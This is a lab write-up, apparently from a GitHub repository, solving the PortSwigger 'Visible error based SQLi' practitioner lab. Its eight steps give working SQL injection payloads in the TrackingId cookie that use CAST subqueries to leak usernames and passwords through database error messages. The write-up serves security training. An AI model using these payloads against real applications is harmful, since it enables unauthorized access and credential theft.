# SQL Injection - Visible error based SQLi

## 📌 Lab Details
- **Title**: Visible error based SQLi
- **Difficulty**: Practitioner
- **Category**: SQL Injection
- **Lab URL**: https://portswigger.net/academy/labs/launch/706318b8f1857a10698288c9bf7712276e4ab38822541edeb0385a44da54de78?referrer=%2fweb-security%2fsql-injection%2fblind%2flab-sql-injection-visible-error-based

## 🔍 Summary
This lab demonstrated how to use visble error messages to obtain the username of the `administrator `

## 🛠 Steps to Solve
1. Append a single quote to the TrackingId `TrackingId=ogAZZfxtOKUELbuJ'`. Notice the error message which explains that you have an unclosed string literal.
2. Added comment characters to comment out the rest of the query `TrackingId=ogAZZfxtOKUELbuJ'--`. No error means that the query is syntactically valid.
3. Now adapt the query to include a generic `SELECT` subquery `TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--`. Notice a different error saying `AND` condition must be a boolean expression.
4. Modifying the condition accordingly `TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--`. No error is recieved.
5. Added a generic `SELECT ` statement `TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--`. Error recieved of character limit.
6. Deleted the original `TrackingId` cookie to free up some space `TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--`. New error is recieved because it returned more than one row.
7. Modifying the query to return only one row `TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--`. The error message now leaks the first username from the `users` table.
8. Retrieving the password for the first user `TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`. The password is obtained.
   
## 📖 Key Takeaways
- How to use the `CAST` function in an SQL query.
- Use of visible error for retrieval of information.
   
## 🖼️ Screenshot 
![image](https://github.com/user-attachments/assets/36ad818f-8ce5-4396-8da2-d975d87c7250)
![image](https://github.com/user-attachments/assets/cf178945-e027-4224-a13f-1f8d05c68c09)
![image](https://github.com/user-attachments/assets/a122a273-6021-4fbf-98bf-e0bc210f75c4)
![image](https://github.com/user-attachments/assets/7818bbf9-74d4-4fd0-b07d-657cc6a7feb1)
![image](https://github.com/user-attachments/assets/cf8615d8-e38a-4887-82d0-e7418a333bfe)
![image](https://github.com/user-attachments/assets/fca21a1d-f40d-41ff-b2cb-f955ad74ff6e)
![image](https://github.com/user-attachments/assets/3cdcf055-57da-4543-ad51-51b2033bd15b)
![image](https://github.com/user-attachments/assets/f0a9b992-c4c4-45e3-97a2-1290078fcd0b)
![image](https://github.com/user-attachments/assets/3519abc9-3a9e-45ed-a6cf-5347d3dda1db)
